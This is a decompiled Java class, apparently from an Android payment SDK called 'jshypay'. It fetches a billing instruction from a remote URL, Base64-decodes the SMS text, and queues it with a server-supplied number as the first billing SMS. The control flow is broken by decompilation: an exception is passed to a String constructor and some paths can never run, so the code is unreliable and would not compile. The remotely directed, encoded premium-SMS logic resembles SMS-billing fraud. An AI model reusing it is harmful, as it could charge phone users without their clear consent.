package com.jshymedia.jshypay.order;

import android.util.Base64;
import com.jshymedia.jshypay.net.FlagOnError;
import com.jshymedia.jshypay.ztool.JsonTool;
import com.jshymedia.jshypay.ztool.ZNetManager;
import com.jshymedia.jshypay.ztool.Zlog;
import java.util.HashMap;
import org.json.JSONException;
import org.json.JSONObject;

final class f
  implements Runnable
{
  f(OrderHelperForDSms paramOrderHelperForDSms) {}
  
  public final void run()
  {
    Object localObject3 = null;
    if (OrderHelperForDSms.a(this.a).isFinish()) {}
    while (OrderHelperForDSms.a(this.a).isD_isHandle()) {
      return;
    }
    OrderHelperForDSms.a(this.a).setD_isHandle(true);
    Object localObject1 = this.a.makeDurl(OrderHelperForDSms.a(this.a).getD_FirstSmsUrl());
    Zlog.syso("first_url:" + (String)localObject1);
    try
    {
      localObject1 = ZNetManager.getByteFromNet((String)localObject1, null, 0, null);
      if (localObject1 == null)
      {
        OrderHelperForDSms.a(this.a).finishWithCallbcak(-1);
        return;
      }
    }
    catch (JSONException localJSONException1) {}
    for (;;)
    {
      FlagOnError.onSmsDNoSms((String)localObject3, OrderHelperForDSms.a(this.a));
      OrderHelperForDSms.a(this.a).finishWithCallbcak(-1);
      localJSONException1.printStackTrace();
      return;
      Object localObject2 = new String(localJSONException1);
      try
      {
        localObject3 = new JSONObject((String)localObject2).getJSONObject("info").toString();
        localObject2 = (SmsComm)JsonTool.getSingleModeFromJson((String)localObject3, SmsComm.class);
        Zlog.syso("first_sms:" + localObject2);
        if ((localObject2 != null) && (((SmsComm)localObject2).billMoMsg != null) && (((SmsComm)localObject2).billMoNumber != null))
        {
          ((SmsComm)localObject2).billMoMsg = OrderHelperForDSms.replaceOther(((SmsComm)localObject2).billMoMsg);
          ((SmsComm)localObject2).billMoMsg = new String(Base64.decode(((SmsComm)localObject2).billMoMsg, 0));
          OrderHelperForDSms.a(this.a).setD_FirstSms((SmsComm)localObject2);
          OrderHelperForDSms.a(this.a).setD_isFirstSended(true);
          OrderHelperForDSms.a(this.a, (SmsComm)localObject2);
          OrderHelperForDSms.a(this.a).getD_maps().put("contentid", ((SmsComm)localObject2).contentid);
          return;
        }
        OrderHelperForDSms.a(this.a).finishWithCallbcak(-1);
        return;
      }
      catch (JSONException localJSONException2)
      {
        localObject3 = localObject2;
        localObject2 = localJSONException2;
      }
    }
  }
}
